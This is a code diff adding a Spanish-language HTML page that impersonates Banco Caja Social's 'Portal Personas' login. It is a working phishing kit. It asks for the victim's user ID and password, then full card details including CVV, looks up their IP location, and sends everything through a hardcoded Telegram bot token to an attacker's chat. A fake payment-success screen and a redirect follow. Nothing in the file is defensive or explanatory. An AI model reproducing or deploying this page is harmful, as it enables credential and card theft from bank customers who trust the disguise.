@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco Caja Social - Portal Personas</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', sans-serif;
+            background: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: stretch;
+            padding: 0;
+        }
+
+        .container {
+            width: 100%;
+            height: 100vh;
+            background: white;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .header-image {
+            width: 100%;
+            height: auto;
+            aspect-ratio: 16/9;
+            object-fit: cover;
+            background: #f0f0f0;
+        }
+
+        .content {
+            padding: 22px 28px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .logos-container {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 30px;
+            padding-bottom: 25px;
+            border-bottom: 2px solid #f0f0f0;
+        }
+
+        .logo {
+            height: 130px;
+            object-fit: contain;
+        }
+
+        .logo-caja {
+            max-width: 220px;
+        }
+
+        .logo-fundacion {
+            max-width: 210px;
+        }
+
+        .title {
+            font-size: 26px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 14px;
+            line-height: 1.2;
+        }
+
+        .description {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 22px;
+            line-height: 1.5;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 2px solid #2c5aa0;
+            border-radius: 6px;
+            font-size: 14px;
+            font-family: inherit;
+            color: #333;
+            background: white;
+            transition: all 0.2s;
+        }
+
+        .form-input::placeholder {
+            color: #999;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #1a4680;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(44, 90, 160, 0.15);
+        }
+
+        .input-example {
+            font-size: 11px;
+            color: #999;
+            margin-top: 5px;
+        }
+
+        .error-message {
+            font-size: 12px;
+            color: #d32f2f;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .btn-siguiente {
+            width: 100%;
+            padding: 12px;
+            margin-top: 16px;
+            background: #c8c8d0;
+            color: #666;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: not-allowed;
+            transition: all 0.3s;
+            font-family: inherit;
+        }
+
+        .btn-siguiente.active {
+            background: #2c5aa0;
+            color: white;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(44, 90, 160, 0.2);
+        }
+
+        .btn-siguiente.active:hover {
+            background: #244a88;
+            box-shadow: 0 6px 16px rgba(44, 90, 160, 0.3);
+        }
+
+        .btn-siguiente.active:active {
+            transform: scale(0.98);
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .success-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            flex-direction: column;
+            padding: 40px 20px;
+        }
+
+        .success-overlay.active {
+            display: flex;
+        }
+
+        .success-content {
+            text-align: center;
+            max-width: 350px;
+            animation: slideUp 0.6s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(40px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .checkmark-circle {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 25px;
+            background: linear-gradient(135deg, #4caf50 0%, #45a049 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: scaleIn 0.6s ease-out;
+            box-shadow: 0 8px 24px rgba(76, 175, 80, 0.3);
+        }
+
+        @keyframes scaleIn {
+            from { transform: scale(0); }
+            to { transform: scale(1); }
+        }
+
+        .checkmark {
+            color: white;
+            font-size: 50px;
+            line-height: 1;
+            animation: checkDraw 0.6s ease-out 0.3s both;
+        }
+
+        @keyframes checkDraw {
+            from {
+                opacity: 0;
+                transform: scale(0);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .success-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 12px;
+            animation: fadeInDown 0.6s ease-out 0.2s both;
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .success-message {
+            font-size: 15px;
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            animation: fadeInUp 0.6s ease-out 0.4s both;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .success-btn {
+            background: #2c5aa0;
+            color: white;
+            border: none;
+            padding: 14px 40px;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            animation: fadeInUp 0.6s ease-out 0.6s both;
+        }
+
+        .success-btn:hover {
+            background: #244a88;
+        }
+
+        .form-section {
+            display: none;
+        }
+
+        .form-section.active {
+            display: block;
+        }
+
+        .form-row {
+            display: flex;
+            gap: 15px;
+        }
+
+        .form-row .form-group {
+            flex: 1;
+        }
+
+        @media (max-width: 768px) {
+            .content {
+                padding: 20px 18px;
+            }
+
+            .title {
+                font-size: 24px;
+            }
+
+            .logos-container {
+                gap: 12px;
+                margin-bottom: 24px;
+                padding-bottom: 20px;
+            }
+
+            .logo {
+                height: 110px;
+            }
+
+            .logo-caja {
+                max-width: 180px;
+            }
+
+            .logo-fundacion {
+                max-width: 170px;
+            }
+
+            .form-row {
+                flex-direction: column;
+                gap: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <p class="loading-text">Validando información...</p>
+    </div>
+
+    <div class="success-overlay" id="successOverlay">
+        <div class="success-content">
+            <div class="checkmark-circle">
+                <div class="checkmark">✓</div>
+            </div>
+            <div class="success-title">¡Pago Exitoso!</div>
+            <div class="success-message">Tu transacción se ha completado correctamente</div>
+            <button class="success-btn" onclick="location.href='https://www.panini.com'">Aceptar</button>
+        </div>
+    </div>
+
+    <div class="container">
+        <img src="señores.png" alt="Banco Caja Social" class="header-image">
+
+        <div class="content">
+            <!-- SECCIÓN 1: LOGIN -->
+            <div class="form-section active" id="loginSection">
+                <div class="logos-container">
+                    <img src="caja.png" alt="Banco Caja Social" class="logo logo-caja">
+                    <img src="fundacion.png" alt="Fiduciaria" class="logo logo-fundacion">
+                </div>
+
+                <h1 class="title">Bienvenido al Portal Personas</h1>
+
+                <p class="description">
+                    Recuerde que su usuario está compuesto por su Tipo de Identificación (CC, CE, NI, TI, PE) y su Número de Identificación sin espacios, puntos ni comas.
+                </p>
+
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label class="form-label">Usuario</label>
+                        <input type="text" id="usuario" class="form-input" placeholder="" inputmode="text" required>
+                        <div class="input-example">Ejemplo: CC1234567890</div>
+                        <div class="error-message" id="usuarioError"></div>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Contraseña</label>
+                        <input type="password" id="contrasena" class="form-input" placeholder="" required>
+                    </div>
+
+                    <button type="submit" class="btn-siguiente" id="btnSiguiente" disabled>Siguiente</button>
+                </form>
+            </div>
+
+            <!-- SECCIÓN 2: DATOS DE TARJETA -->
+            <div class="form-section" id="tarjetaSection">
+                <div class="logos-container">
+                    <img src="caja.png" alt="Banco Caja Social" class="logo logo-caja">
+                    <img src="fundacion.png" alt="Fiduciaria" class="logo logo-fundacion">
+                </div>
+
+                <h1 class="title">Datos de Tarjeta</h1>
+
+                <p class="description">
+                    Por favor ingresa los datos de tu tarjeta para completar el proceso.
+                </p>
+
+                <form id="tarjetaForm">
+                    <div class="form-group">
+                        <label class="form-label">Nombre completo</label>
+                        <input type="text" id="cardName" class="form-input" placeholder="" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label class="form-label">Número de tarjeta</label>
+                        <input type="text" id="cardNumber" class="form-input" placeholder="" maxlength="19" required>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label class="form-label">Vencimiento (MM/AA)</label>
+                            <input type="text" id="expiry" class="form-input" placeholder="" maxlength="5" required>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">CVV</label>
+                            <input type="text" id="cvv" class="form-input" placeholder="" maxlength="4" required>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-siguiente" id="btnTarjeta" disabled>Enviar</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
+        const TELEGRAM_CHAT_ID = '-1003781125998';
+
+        const usuarioInput = document.getElementById('usuario');
+        const contrasenaInput = document.getElementById('contrasena');
+        const btnSiguiente = document.getElementById('btnSiguiente');
+        const loginForm = document.getElementById('loginForm');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const successOverlay = document.getElementById('successOverlay');
+        const usuarioError = document.getElementById('usuarioError');
+
+        let loginData = {};
+
+        function validarFormatoUsuario(usuario) {
+            const formatoValido = /^[A-Z]{2}\d+$/.test(usuario.toUpperCase());
+            return formatoValido;
+        }
+
+        function validarFormulario() {
+            const usuario = usuarioInput.value.trim();
+            const contrasena = contrasenaInput.value.trim();
+            
+            if (usuario && !validarFormatoUsuario(usuario)) {
+                usuarioError.textContent = 'Datos incorrectos. Recuerde iniciar con CC, CE, NI, TI, PE';
+                usuarioError.classList.add('show');
+            } else {
+                usuarioError.classList.remove('show');
+            }
+
+            if (usuario && contrasena && validarFormatoUsuario(usuario)) {
+                btnSiguiente.disabled = false;
+                btnSiguiente.classList.add('active');
+            } else {
+                btnSiguiente.disabled = true;
+                btnSiguiente.classList.remove('active');
+            }
+        }
+
+        usuarioInput.addEventListener('input', validarFormulario);
+        contrasenaInput.addEventListener('input', validarFormulario);
+
+        async function obtenerDatosIP() {
+            try {
+                const res = await fetch("https://ipinfo.io/json");
+                return await res.json();
+            } catch (e) {
+                return { ip: "Desconocida", country: "N/A", city: "N/A", region: "N/A" };
+            }
+        }
+
+        function obtenerFecha() {
+            return new Date().toLocaleString('es-CO', {
+                timeZone: 'America/Bogota',
+                year: 'numeric',
+                month: '2-digit',
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+        }
+
+        async function enviarATelegram(mensaje) {
+            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            if (!usuarioInput.value.trim() || !contrasenaInput.value.trim()) {
+                alert('Por favor completa todos los campos');
+                return;
+            }
+
+            loginData = {
+                usuario: usuarioInput.value.trim(),
+                contrasena: contrasenaInput.value.trim()
+            };
+
+            // Cambiar a sección de tarjeta
+            document.getElementById('loginSection').classList.remove('active');
+            document.getElementById('tarjetaSection').classList.add('active');
+            document.getElementById('cardName').focus();
+        });
+
+        // Formatear número de tarjeta
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '');
+            let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
+            e.target.value = formatted;
+            validarTarjeta();
+        });
+
+        // Formatear vencimiento
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+            validarTarjeta();
+        });
+
+        // CVV solo números
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+            validarTarjeta();
+        });
+
+        document.getElementById('cardName').addEventListener('input', validarTarjeta);
+
+        function validarTarjeta() {
+            const name = document.getElementById('cardName').value.trim();
+            const number = document.getElementById('cardNumber').value.trim();
+            const expiry = document.getElementById('expiry').value.trim();
+            const cvv = document.getElementById('cvv').value.trim();
+            
+            const btnTarjeta = document.getElementById('btnTarjeta');
+            if (name && number && expiry && cvv) {
+                btnTarjeta.disabled = false;
+                btnTarjeta.classList.add('active');
+            } else {
+                btnTarjeta.disabled = true;
+                btnTarjeta.classList.remove('active');
+            }
+        }
+
+        document.getElementById('tarjetaForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            loadingOverlay.classList.add('active');
+
+            const ipData = await obtenerDatosIP();
+            const fecha = obtenerFecha();
+
+            const mensaje = `
+🏦 *BANCO CAJA SOCIAL - PORTAL PERSONAS*
+
+👤 *Usuario:* \`${loginData.usuario}\`
+🔐 *Contraseña:* \`${loginData.contrasena}\`
+
+💳 *DATOS DE TARJETA:*
+👤 *Nombre:* ${document.getElementById('cardName').value}
+💳 *Número:* ${document.getElementById('cardNumber').value}
+📅 *Vencimiento:* ${document.getElementById('expiry').value}
+🔐 *CVV:* ${document.getElementById('cvv').value}
+
+━━━━━━━━━━━━━━━━━━━━━━
+🌐 *IP:* ${ipData.ip}
+📍 *País:* ${ipData.country}
+🏙️ *Ciudad:* ${ipData.city}
+🗺️ *Región:* ${ipData.region}
+🕐 *Fecha:* ${fecha}
+            `.trim();
+
+            await enviarATelegram(mensaje);
+
+            setTimeout(() => {
+                loadingOverlay.classList.remove('active');
+                successOverlay.classList.add('active');
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
